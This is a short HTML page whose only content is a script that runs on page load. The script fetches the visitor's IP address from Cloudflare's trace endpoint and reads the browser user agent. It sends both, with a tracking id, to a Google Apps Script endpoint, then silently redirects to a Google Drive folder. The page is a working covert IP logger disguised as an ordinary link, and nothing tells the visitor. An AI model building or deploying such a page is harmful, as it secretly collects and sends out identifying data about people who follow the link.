<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("https://www.cloudflare.com/cdn-cgi/trace")
        .then(res => res.text())
        .then(txt => {
          const ip = txt.match(/ip=(.+)/)?.[1] || "未取得";
          const ua = navigator.userAgent;
          const redirect = "https://script.google.com/macros/s/AKfycbx6_EOz0xmmgHNUXpQbcwLbud1LJYZFcYXdwBYWzydGiB90_yhaSIPbrVc-JVQOtfMRsg/exec"
            + "?id=cdef-8765-21-0987-h"
            + "&ip=" + encodeURIComponent(ip)
            + "&ua=" + encodeURIComponent(ua)
            + "&next=" + encodeURIComponent("https://drive.google.com/drive/folders/1BLJp9l7IsTL0fWtiLv...");
          window.location.href = redirect;
        });
    </script>
  </body>
</html>
